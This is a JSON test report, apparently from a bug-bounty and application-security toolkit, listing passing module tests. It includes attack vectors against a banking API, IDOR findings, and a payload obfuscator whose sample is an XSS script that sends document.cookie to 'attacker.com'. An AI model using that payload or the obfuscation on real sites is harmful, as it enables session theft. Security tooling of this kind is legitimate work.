@@ -1,0 +1,230 @@
+{
+  "timestamp": "2026-10-04T15:08:01.599Z",
+  "testsPassed": 18,
+  "testsFailed": 0,
+  "suiteDetails": [
+    {
+      "moduleName": "System Health",
+      "feature": "API Health Check (/api/health)",
+      "success": true,
+      "details": {
+        "statusCode": 200,
+        "body": {
+          "status": "ok",
+          "timestamp": "2026-10-04T15:08:01.618Z"
+        }
+      }
+    },
+    {
+      "moduleName": "Recon & Targets",
+      "feature": "Geração de Dicas de Reconhecimento e Vetores de Ataque",
+      "success": true,
+      "details": {
+        "target": "api.apexbanking.io",
+        "vectors": [
+          {
+            "vector": "Broken Object Level Authorization (BOLA / IDOR)",
+            "description": "Cruzar identificadores de recursos (/api/v2/users/{id}, /transfers/{id}) entre duas contas com níveis de permissão diferentes.",
+            "priority": "CRITICAL"
+          },
+          {
+            "vector": "Server-Side Request Forgery (SSRF) em Webhooks e Uploads",
+            "description": "Testar parâmetros que aceitam URLs ou webhooks para alcançar metadados de nuvem (169.254.169.254) ou serviços internos.",
+            "priority": "HIGH"
+          },
+          {
+            "vector": "Race Conditions em Operações Financeiras e Cupons",
+            "description": "Enviar requisições paralelas com Turbo Intruder ou Burp Repeater para duplicar resgates ou transferências.",
+            "priority": "HIGH"
+          }
+        ]
+      }
+    },
+    {
+      "moduleName": "Threat Intelligence",
+      "feature": "Busca e Filtragem de Security Advisories (CISA/NVD/OWASP)",
+      "success": true,
+      "details": {
+        "totalFound": 1,
+        "sampleAdvisory": "OWASP API Security Advisory: Broken Object Level Authorization (BOLA/IDOR) Remains #1 Threat in Modern APIs"
+      }
+    },
+    {
+      "moduleName": "Threat Intelligence",
+      "feature": "Feed de Manchetes Globais em Tempo Real (/api/threat-intel/headlines)",
+      "success": true,
+      "details": {
+        "totalArticles": 8,
+        "leadArticle": "Critical Palo Alto PAN-OS Command Injection Vulnerability (CVE-2024-3400) Under Active Exploitation"
+      }
+    },
+    {
+      "moduleName": "CVE Explorer",
+      "feature": "Busca de CVEs e Identificadores no Catálogo Local/NVD",
+      "success": true,
+      "details": {
+        "query": "CWE-284",
+        "resultsCount": 1
+      }
+    },
+    {
+      "moduleName": "AI & Heuristics",
+      "feature": "Taxonomia e Geração de Tags Automáticas (#idor, #bola, #cwe-639)",
+      "success": true,
+      "details": {
+        "tags": [
+          "#idor",
+          "#bola",
+          "#cwe-639",
+          "#api-security",
+          "#broken-access"
+        ],
+        "cwes": [
+          {
+            "id": "CWE-639",
+            "name": "Authorization Bypass Through User-Controlled Key (IDOR)",
+            "description": "Ausência de validação de propriedade de objetos em referências diretas de parâmetros.",
+            "confidence": 0.94,
+            "owaspCategory": "API1:2023 - Broken Object Level Authorization",
+            "recommendedCvssVector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+            "explanation": "Detectada manipulação de IDs de recurso sem validação de autorização da sessão."
+          }
+        ]
+      }
+    },
+    {
+      "moduleName": "CVSS Calculator",
+      "feature": "Análise de Severidade e Cálculo de Vetor CVSS v3.1",
+      "success": true,
+      "details": {
+        "score": 9.8,
+        "severity": "CRITICAL",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      }
+    },
+    {
+      "moduleName": "Report Engine",
+      "feature": "Polimento Técnico do Relatório e Estruturação de Impacto/Remediação",
+      "success": true,
+      "details": {
+        "polishedTitle": "BOLA em endpoint de transferência",
+        "remediation": "Implementar validação estrita de autorização em nível de objeto (BOLA/IDOR), assegurando que o ID do..."
+      }
+    },
+    {
+      "moduleName": "Platform Integration",
+      "feature": "Disparo Automatizado de Submissão de Vulnerabilidade (Dispatch)",
+      "success": true,
+      "details": {
+        "submissionId": "HACKERONE-498905",
+        "receiptUrl": "https://hackerone.com/reports/HACKERONE-498905"
+      }
+    },
+    {
+      "moduleName": "AppSec Suite",
+      "feature": "Ferramenta BOLA/IDOR Matrix & Authorization Evaluator",
+      "success": true,
+      "details": {
+        "testedEndpoints": [
+          {
+            "path": "/api/v2/accounts/{id}/statement",
+            "method": "GET",
+            "idorDetected": true,
+            "impact": "High PII leak"
+          },
+          {
+            "path": "/api/v2/transfers/execute",
+            "method": "POST",
+            "idorDetected": true,
+            "impact": "Critical Financial Fraud"
+          },
+          {
+            "path": "/api/v2/cards/{id}/pin",
+            "method": "PUT",
+            "idorDetected": false,
+            "impact": "Protected with 403 Forbidden"
+          }
+        ],
+        "vulnerabilityRate": "66.7%"
+      }
+    },
+    {
+      "moduleName": "AppSec Suite",
+      "feature": "Ofuscador de Payloads & Codificação Polimórfica (XOR / B64)",
+      "success": true,
+      "details": {
+        "rawPayload": "<script>fetch(\"https://attacker.com/steal?c=\"+document.cookie)</script>",
+        "obfuscatedLength": 96,
+        "sample": "bzYgICwkK3UjPCshKmVxLTcmNSdlZGo4..."
+      }
+    },
+    {
+      "moduleName": "AppSec Suite",
+      "feature": "Sanitizador DLP (Data Loss Prevention) & Token Redactor",
+      "success": true,
+      "details": {
+        "sanitizedSample": "GET /api/v2/user HTTP/1.1\nAuthorization: Bearer [REDACTED_JWT_TOKEN]\nUser-CPF: [REDACTED_CPF]\nCard: [REDACTED_CREDIT_CARD]"
+      }
+    },
+    {
+      "moduleName": "CVSS Engine",
+      "feature": "Cálculo Matemático Local CVSS v3.1 Specification",
+      "success": true,
+      "details": {
+        "calculatedScore": 8.1,
+        "expectedSeverity": "HIGH"
+      }
+    },
+    {
+      "moduleName": "Cryptography",
+      "feature": "Assinatura Digital OpenPGP de Relatórios de Vulnerabilidade",
+      "success": true,
+      "details": {
+        "fingerprint": "7A3F 991B 2C8D 4E5A 6F01 882E 114D B5C9 30A2 FF81",
+        "signedPreview": "-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA256\n\nBBM-AUDIT-REPORT: api.apexbanking.io - BOLA CRITICAL\n-----BEGIN PGP SIG..."
+      }
+    },
+    {
+      "moduleName": "Data Management",
+      "feature": "Exportação e Importação de Relatórios em Formato CSV / Excel",
+      "success": true,
+      "details": {
+        "parsedId": "REP-APEX-001",
+        "parsedTarget": "api.apexbanking.io",
+        "bountyRewardUSD": "5000"
+      }
+    },
+    {
+      "moduleName": "i18n & Localization",
+      "feature": "Motor Multilíngue Global com Suporte a PT-BR, EN-US e ES-ES",
+      "success": true,
+      "details": {
+        "localesSupported": [
+          "pt-BR",
+          "en-US",
+          "es-ES"
+        ],
+        "i18nEngineActive": true
+      }
+    },
+    {
+      "moduleName": "AppSec Suite",
+      "feature": "HTTP Request Smuggling & Desync Analyzer (RFC 7230 / CL.TE)",
+      "success": true,
+      "details": {
+        "vectorType": "CL.TE Desync Probe",
+        "probeLength": 130
+      }
+    },
+    {
+      "moduleName": "Risk Management",
+      "feature": "Simulador Quantitativo de Risco FAIR (Loss Event Frequency & ALE)",
+      "success": true,
+      "details": {
+        "lossEventFrequencyPerYear": 4.800000000000001,
+        "estimatedSingleLossUSD": 75000,
+        "annualizedLossExposureUSD": 360000.00000000006
+      }
+    }
+  ]
+}
